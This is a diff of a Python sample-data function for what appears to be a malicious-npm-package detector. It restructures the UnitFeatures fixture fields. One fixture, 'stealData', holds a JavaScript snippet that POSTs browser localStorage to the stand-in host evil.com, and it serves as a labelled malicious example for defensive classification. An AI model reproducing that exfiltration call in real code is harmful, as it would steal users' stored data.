@@ -50,30 +50,32 @@ def create_sample_data():
 
     # Sample benign unit features
     benign_unit = UnitFeatures(
-        raw_content="function isValid(input) { return input != null && input.length > 0; }",
-        file_path="src/utils.js",
         unit_name="isValid",
+        file_path="src/utils.js",
         unit_type="function",
         ecosystem="npm",
+        raw_content="function isValid(input) { return input != null && input.length > 0; }",
         api_counts={"validation": 1},
         shannon_entropy=3.2,
         obfuscation_score=0.1,
-        phase_indicators={"runtime": 1.0, "install": 0.0, "test": 0.0},
-        metadata={"file_size": 156, "imports_count": 0}
+        phase="runtime",
+        file_size_bytes=156,
+        num_imports=0
     )
 
     # Sample malicious unit features
     malicious_unit = UnitFeatures(
-        raw_content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }",
-        file_path="src/stealer.js",
         unit_name="stealData",
+        file_path="src/stealer.js",
         unit_type="function",
         ecosystem="npm",
-        api_counts={"net.outbound": 1, "storage.access": 1},
+        raw_content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }",
+        api_counts={"net.outbound": 1},
         shannon_entropy=4.1,
         obfuscation_score=0.3,
-        phase_indicators={"runtime": 1.0, "install": 0.0, "test": 0.0},
-        metadata={"file_size": 98, "imports_count": 0}
+        phase="runtime",
+        file_size_bytes=98,
+        num_imports=0
     )
 
     # Sample benign package
